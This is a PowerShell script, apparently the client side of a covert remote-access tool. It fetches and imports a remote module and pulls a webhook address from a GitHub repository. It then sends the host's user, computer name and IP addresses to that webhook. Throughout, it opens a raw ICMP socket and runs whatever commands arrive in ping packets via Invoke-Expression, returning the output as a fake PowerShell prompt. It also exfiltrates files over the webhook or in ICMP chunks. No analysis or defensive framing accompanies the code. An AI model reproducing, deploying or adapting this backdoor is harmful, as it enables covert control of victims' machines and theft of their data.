$VERSION = "1.03"
Add-Type -AssemblyName  Microsoft.VisualBasic, PresentationCore, PresentationFramework, System.Drawing, System.Windows.Forms, WindowsBase, WindowsFormsIntegration, System; 
iwr -Uri "https://raw.githubusercontent.com/jh1sc/Posh-Header/main/Posh-H.psm1" -OutFile "$env:temp\Posh-H.psm1"; ipmo "$env:temp\Posh-H.psm1"; Header
$F = [Windows.Native.Kernel32]::GetCurrentConsoleFontEx(); $F.FontIndex = 0; $F.FontWidth = 6; $F.FontHeight = 12; $F.FontFamily = 54; $F.FontWeight = 1000; $F.FaceName = "SimSun-ExtB"; [Windows.Native.Kernel32]::SetCurrentConsoleFontEx($F)

Class Haul {
    $file
    $WbhkUrl
    #Set Default Webhook URL
    sdwk ([string]$WebhookUrl) {
        $this.WbhkUrl = $WebhookUrl
        Write-Verbose "Set Default to $($this.WbhkUrl)"
    }

    jWebhook ([System.Collections.Hashtable]$str) {
        $json = $str | ConvertTo-Json
        Invoke-RestMethod -Uri ($this.WbhkUrl) -Method POST -Body $json -ContentType "application/json"
    }
 

    fWebhook ([string]$filePath) {
        $this.file = $filePath; $Content = Get-Content $this.file
        $irm = Invoke-RestMethod -Uri ($this.WbhkUrl) -Method POST -Body $Content -ContentType "application/json"
        if ([bool]$irm -eq $true) {
            Write-Output "Success Sending $($this.file) to $($this.WbhkUrl)"
            Write-Verbose "Success Sending $($this.file) to $($this.WbhkUrl)"
        }
        else {
            Write-Output "Failed Sending $($this.file) to $($this.WbhkUrl)"
            Write-Verbose "Failed Sending $($this.file) to $($this.WbhkUrl)"
        }
    }

    OverIcmp ([string]$filePath) {
        Write-Output f
        $this.file = $filePath
        Write-Output byf
        $script:Icmp.sBytes("File")
        Write-Output rec
        $script:Icmp.Receive()
        [int]$bufSize = 1472; $stream = [System.IO.File]::OpenRead(($this.file)); $chunkNum = 0
        $TotalChunks = [math]::floor($stream.Length / 1472); 
        $barr = New-Object byte[] $bufSize
        Write-Output while
        while ($stream.Read($barr, 0, $bufsize)) {
            $chunkNum += 1
            if ($chunkNum -eq ($TotalChunks)) {
                $script:Icmp.sBytes("End")
                $script:icmp.sBytes("PS $((Get-Location).Path)> ")
                break
            }
            else {
                $script:Icmp.sBytes("Done with $chunkNum out of $TotalChunks In $($this.file)")
                Write-Output "Done with $chunkNum out of $TotalChunks"
                $script:Icmp.sBytes([System.Text.Encoding]::ASCII.GetString($barr))
                $script:Icmp.Receive()
            }      
        }
    }
}

class Icmp {
    $ping = [System.Net.NetworkInformation.Ping]::new() #Ping Stoof Obj
    $pingOpt = [System.Net.NetworkInformation.PingOptions]::new() #Ping Stoof Obj Options
    $pingTimeout = 20  #Ping Stoof Obj Timeour
    $EL = $this.EL #End Char
    [byte[]]$buffer #byte buffer
    [ipaddress]$d_IP #Binding IP Address
    [ipaddress]$b_IP #Binding IP Address
    [System.Net.Sockets.Socket] $Socket #Socket For Communication
    InitAll (
        [int]$pto,
        [ipaddress]$dA,
        [ipaddress]$bA,
        [System.Net.Sockets.AddressFamily]$AddressFamily,
        [System.Net.Sockets.SocketType]$SocketType,
        [System.Net.Sockets.ProtocolType]$ProtocolType
    ) {
        $this.pingTimeout = $pto
        $this.d_IP = $dA; $this.b_IP = $bA
        $this.Socket = New-Object System.Net.Sockets.Socket( $AddressFamily, $SocketType, $ProtocolType )
        $this.Socket.bind([system.net.IPEndPoint]::new([system.net.IPAddress]::Parse($this.b_IP), 0))
        $this.Socket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), $null)
        [byte[]]$this.buffer = 0..($this.Socket.ReceiveBufferSize) | % { 0 }
        $this.pingOpt.DontFragment = $true
        Write-Verbose "Intialised"
    }
    CreateSocket([System.Net.Sockets.AddressFamily]$AddressFamily, [System.Net.Sockets.SocketType]$SocketType, [System.Net.Sockets.ProtocolType]$ProtocolType) {
        $this.Socket = New-Object System.Net.Sockets.Socket( $AddressFamily, $SocketType, $ProtocolType )
        Write-Verbose "Socket Intialised"
    }
    SetAddresses([ipaddress]$bA, [ipaddress]$dA) {
        if (Test-Connection -ComputerName $dA -Count 1 -BufferSize 256) {
            $this.d_IP = $dA
            Write-Verbose "Binding IP Address Set."
        }
        else {
            Write-Error "Failed To Connect to [$($bA)]"
        }
        if (Test-Connection -ComputerName $bA -Count 1 -BufferSize 256) {
            $this.d_IP = $bA
            Write-Verbose "Binding IP Address Set."
        }
        else {
            Write-Error "Failed To Connect to [$($bA)]"
        }
    }
    Bind() {
        try {
            $this.Socket.bind([system.net.IPEndPoint]::new([system.net.IPAddress]::Parse($this.b_IP), 0))
            $this.Socket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), $null)
            [byte[]]$this.buffer = 0..($this.Socket.ReceiveBufferSize) | % { 0 }
        }
        catch { Write-Error "Tried and Failed To Bind To $($this.b_IP)"; $error[0] | Out-String; $error.clear() }
    }
    Receive () {
        [byte[]]$this.buffer = 0..($this.Socket.ReceiveBufferSize) | % { 0 }
        $this.Socket.Receive($this.buffer) | Out-Null
        Write-Verbose "Received"
    }
    [String] Flush () {
        $FeedBack = ([System.Text.Encoding]::Unicode.GetString($this.buffer[28..$this.Socket.ReceiveBufferSize]))
        $FeedBack = ($FeedBack.Substring(0, ($FeedBack.IndexOf($this.EL)))) 
        Write-Verbose "Received"
        return $FeedBack
    }
    ConfPing ([int]$pto) {
        $this.pingTimeout = $pto
        $this.pingOpt.DontFragment = $true
    }
    sBytes ([string]$m) {
        $this.ping.Send(
            [ipaddress]($this.d_IP), $this.pingTimeout, (([text.encoding]::Unicode).GetBytes($m + ($this.EL))), $this.pingOpt
        )
    }
}
$SendingIP = "0.0.0.0"
$BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress)
$icmp = [Icmp]::new()
$icmp.InitAll(20, $SendingIP, $BindingIP, "InterNetwork", "Raw", "Icmp")


$Updt = @{
    "ClientVer"    = "$($VERSION)"
    "Prv-IP"       = "$((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress)"
    "Binding IP"   = "$($BindingIP)"
    "User"         = "$($env:USERPROFILE)"
    "Pub-IP"       = "$((iwr -Uri "https://api.ipify.org").Content)"
    "ComputerName" = "$($env:ComputerName)"
    "Date"         = "$(Get-Date)"
}
$Haul = [Haul]::new()
$Haul.sdwk(((iwr https://raw.githubusercontent.com/jh1sc/Conex/main/Client).content))
$Haul.jWebhook($Updt)


while ($true) {
    $icmp.Receive()
    if ($icmp.Flush() -eq "H_IP") {
        $icmp.Receive(); $icmp.InitAll(20, $icmp.Flush(), $BindingIP, "InterNetwork", "Raw", "Icmp")
        $icmp.sBytes("Windows PowerShell running as user $($env:username) on $($env:computername) `nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n")
        $icmp.sBytes("PS $((Get-Location).Path)> ")
        $icmp.Receive();
        [Array]$com = $null; 
        [Array]$com = (Invoke-Expression -Command ($icmp.Flush()))
        [Array]$com = [Array]$com + "`n" + ($error[0] | Out-String); $error.clear()
        $com = $com -split "`r`n"  # Split the string into an array of lines
        foreach ($line in $com) {
            $line += "n"  # Add "n" to the end of the line
        }
        $com = $com -join "`r`n"  # Join the lines back together into a single string
        $icmp.sBytes($com)
        $icmp.sBytes("PS $((Get-Location).Path)> ")
    }
    else {
        [Array]$com = $null
        if ([string]::IsNullOrEmpty($icmp.Flush()) -or [string]::IsNullOrWhiteSpace($icmp.Flush())) {
            [Array]$com = "No Command Received."
        }
        else {
            [Array]$com = (Invoke-Expression -Command ($icmp.Flush()))
            $com = $com -split "`r`n"  # Split the string into an array of lines
            foreach ($line in $com) {
                $line += "n"  # Add "n" to the end of the line
            }
            $com = $com -join "`r`n"  # Join the lines back together into a single string
            [Array]$com = [Array]$com + "`n" + ($error[0] | Out-String); $error.clear()
        }

        $icmp.sBytes($com)
        $icmp.sBytes("PS $((Get-Location).Path)> ")
    }
}
